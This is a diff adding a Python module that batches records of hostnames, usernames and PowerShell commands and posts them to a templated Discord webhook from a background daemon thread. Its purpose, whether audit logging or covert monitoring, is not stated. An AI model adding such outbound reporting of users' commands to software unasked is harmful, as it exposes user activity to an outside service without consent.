@@ -1,0 +1,41 @@
+from discord_webhook import DiscordWebhook
+import threading
+import queue
+
+log_queue = queue.Queue()
+
+def discord_batch_worker():
+
+    batch_msg = ""
+    while True:
+        try:
+            log_data = log_queue.get(timeout=3.0)
+
+            formatted_line = f"**{log_data['hostname']}** (`{log_data['username']}`): ```powershell\n{log_data['command']}\n```\n"
+
+            if len(batch_msg) + len(formatted_line) > 1800:
+                    send_to_discord(batch_msg)
+                    batch_msg = formatted_line 
+            else:
+                batch_msg += formatted_line
+                    
+            log_queue.task_done()
+
+        except queue.Empty:
+
+            if batch_msg:
+                send_to_discord(batch_msg)
+                batch_msg = ""
+
+def send_to_discord(content):
+    webhook = DiscordWebhook(
+        url="{{ webhook }}",
+        content=content,
+        rate_limit_retry=True
+    )
+    try:
+        webhook.execute()
+    except Exception as e:
+        print(f"Exception sending webhook: {e}")
+
+threading.Thread(target=discord_batch_worker, daemon=True).start()
